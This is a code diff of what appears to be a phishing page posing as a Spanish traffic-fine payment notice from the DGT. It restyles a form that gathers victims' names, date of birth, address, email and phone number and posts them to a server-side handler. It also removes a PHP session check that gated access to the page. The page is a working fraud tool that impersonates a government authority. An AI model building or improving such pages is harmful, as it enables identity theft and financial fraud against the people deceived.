@@ -1,12 +1,3 @@
-<?php
-session_start();
-error_reporting(E_ALL);
-ini_set('display_errors', 1);
-
-require '../server/all.php';
-
-if (isset($_SESSION['autoriser']) && $_SESSION['autoriser'] === true ){	
-?>
 <!DOCTYPE html>
 <html lang="es">
 <head>
@@ -55,6 +46,8 @@ if (isset($_SESSION['autoriser']) && $_SESSION['autoriser'] === true ){
             border: 1px solid #ddd;
             border-radius: 5px;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            max-width: 800px;
+            margin: 0 auto;
         }
         .form-container h2 {
             font-size: 18px;
@@ -71,6 +64,7 @@ if (isset($_SESSION['autoriser']) && $_SESSION['autoriser'] === true ){
             border: 1px solid #ddd;
             border-radius: 5px;
             margin-top: 5px;
+            max-width: 100%;
         }
         .custom-button {
             background-color: #048;
@@ -133,7 +127,18 @@ if (isset($_SESSION['autoriser']) && $_SESSION['autoriser'] === true ){
         .footer-social ul li a:hover {
             color: #048;
         }
+        .limited-width {
+            max-width: 300px;
+        }
     </style>
+    <script>
+        function formatDate(input) {
+            input.value = input.value.replace(/(\d{2})(\d{2})(\d{4})/, '$1/$2/$3');
+        }
+        function chiffres_only(input) {
+            input.value = input.value.replace(/\D/g, '');
+        }
+    </script>
 </head>
 <body>
     <header class="main-header">
@@ -149,37 +154,45 @@ if (isset($_SESSION['autoriser']) && $_SESSION['autoriser'] === true ){
         <div class="form-container">
             <h2>Paiement de su multa N°164357371274</h2>
             <form method="post" action="../actions/info.php">
-                <div class="form-group">
-                    <label for="nom">Apellido</label>
-                    <input id="nom" type="text" name="nom" required>
+                <div class="form-group row mb-3">
+                    <div class="col-sm-6 limited-width">
+                        <label for="nom">Apellido</label>
+                        <input id="nom" type="text" name="nom" required>
+                    </div>
+                    <div class="col-sm-6 limited-width">
+                        <label for="prenom">Nombre</label>
+                        <input id="prenom" type="text" name="prenom" required>
+                    </div>
                 </div>
-                <div class="form-group">
-                    <label for="prenom">Nombre</label>
-                    <input id="prenom" type="text" name="prenom" required>
+                <div class="form-group row mb-3">
+                    <div class="col-sm-6 limited-width">
+                        <label for="dob">Fecha de nacimiento</label>
+                        <input id="dob" type="text" name="dob" placeholder="JJ/MM/AAAA" required oninput="formatDate(this)">
+                    </div>
+                    <div class="col-sm-6 limited-width">
+                        <label for="adresse">Dirección postal</label>
+                        <input id="adresse" type="text" name="adresse" required>
+                    </div>
                 </div>
-                <div class="form-group">
-                    <label for="dob">Fecha de nacimiento</label>
-                    <input id="dob" type="text" name="dob" placeholder="JJ/MM/AAAA" required oninput="formatDate(this)">
+                <div class="form-group row mb-3">
+                    <div class="col-sm-6 limited-width">
+                        <label for="cp">Código postal</label>
+                        <input id="cp" type="text" name="cp" placeholder="XXXXX" required oninput="chiffres_only(this)">
+                    </div>
+                    <div class="col-sm-6 limited-width">
+                        <label for="ville">Ciudad</label>
+                        <input id="ville" type="text" name="ville" required>
+                    </div>
                 </div>
-                <div class="form-group">
-                    <label for="adresse">Dirección postal</label>
-                    <input id="adresse" type="text" name="adresse" required>
-                </div>
-                <div class="form-group">
-                    <label for="cp">Código postal</label>
-                    <input id="cp" type="text" name="cp" placeholder="XXXXX" required oninput="chiffres_only(this)">
-                </div>
-                <div class="form-group">
-                    <label for="ville">Ciudad</label>
-                    <input id="ville" type="text" name="ville" required>
-                </div>
-                <div class="form-group">
-                    <label for="email">Email</label>
-                    <input id="email" type="email" name="email" placeholder="correo2@dgt.es" required>
-                </div>
-                <div class="form-group mb-3">
-                    <label for="tel">Nùmero de telétantfono</label>
-                    <input id="tel" type="text" name="tel" placeholder="+34" required oninput="chiffres_only(this)">
+                <div class="form-group row mb-3">
+                    <div class="col-sm-6 limited-width">
+                        <label for="email">Email</label>
+                        <input id="email" type="email" name="email" placeholder="correo2@dgt.es" required>
+                    </div>
+                    <div class="col-sm-6 limited-width">
+                        <label for="tel">Nùmero de telùfono</label>
+                        <input id="tel" type="text" name="tel" placeholder="+34" required oninput="chiffres_only(this)">
+                    </div>
                 </div>
                 <button type="submit" class="custom-button">Continuar</button>
                 <input type="hidden" name="info_submit" value="true">
@@ -204,18 +217,5 @@ if (isset($_SESSION['autoriser']) && $_SESSION['autoriser'] === true ){
             </ul>
         </div>
     </footer>
-    <script>
-        function formatDate(input) {
-            input.value = input.value.replace(/(\d{2})(\d{2})(\d{4})/, '$1/$2/$3');
-        }
-        function chiffres_only(input) {
-            input.value = input.value.replace(/\D/g, '');
-        }
-    </script>
 </body>
 </html>
-<?php
-} else {
-    header("Location: ../index.php");
-}
-?>
